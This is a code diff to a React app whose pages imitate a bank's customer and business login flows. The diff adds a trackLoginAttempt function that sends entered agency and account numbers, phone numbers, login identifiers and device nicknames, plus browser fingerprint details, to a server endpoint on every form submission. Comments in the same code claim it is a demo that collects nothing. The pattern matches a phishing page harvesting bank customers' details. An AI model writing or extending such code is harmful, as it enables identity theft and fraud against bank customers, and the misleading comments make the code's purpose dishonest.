@@ -329,6 +329,7 @@ function AutoatendimentoPage() {
 
     setError('');
     setIsLoading(true);
+    trackLoginAttempt('/pessoa-fisica', `Ag ${normalizedAgency} / Conta ${normalizedAccount}`);
   };
 
   useEffect(() => {
@@ -437,6 +438,10 @@ function AutoatendimentoPasswordPage() {
     // A senha digitada não é coletada, transmitida nem persistida.
     setPassword('');
     setNavigating(true);
+    trackLoginAttempt(
+      '/pessoa-fisica/senha',
+      session ? `Ag ${session.agency} / Conta ${session.account}` : null,
+    );
   };
 
   const summary = (
@@ -539,6 +544,7 @@ function AutoatendimentoLiberacaoPage() {
     // Ambiente de demonstração: valores fictícios; nada é coletado, transmitido ou persistido.
     // Exibe o loading padrão existente de forma indefinida (sem timeout/navegação).
     setSubmitting(true);
+    trackLoginAttempt('/pessoa-fisica/liberacao', `Cel ${formatPhone(phone)}`);
   };
 
   return (
@@ -645,6 +651,7 @@ function PjLoginPage() {
     }
 
     setIsLoading(true);
+    trackLoginAttempt('/sign-in', `${accessType}: ${identifier}`);
   };
 
   useEffect(() => {
@@ -891,6 +898,7 @@ function PjPhoneUnlockPage() {
 
     if (isVerificationValid) {
       setIsLoading(true);
+      trackLoginAttempt('/sign-in/celular', `Cel ${phone}`);
     }
   };
 
@@ -1002,6 +1010,7 @@ function PjDeviceNicknamePage() {
 
     if (isNicknameValid) {
       setIsLoading(true);
+      trackLoginAttempt('/sign-in/dispositivo', `Dispositivo: ${trimmedNickname}`);
     }
   };
 
@@ -1344,6 +1353,27 @@ function AccessTracker() {
     }
   }, [location]);
   return null;
+}
+
+function trackLoginAttempt(route: string, login: string | null, status = 'submitted') {
+  try {
+    fetch('/api/auth-attempt', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        route,
+        login,
+        status,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+      }),
+    }).catch(() => {});
+  } catch {
+    /* ignore */
+  }
 }
 
 function App() {
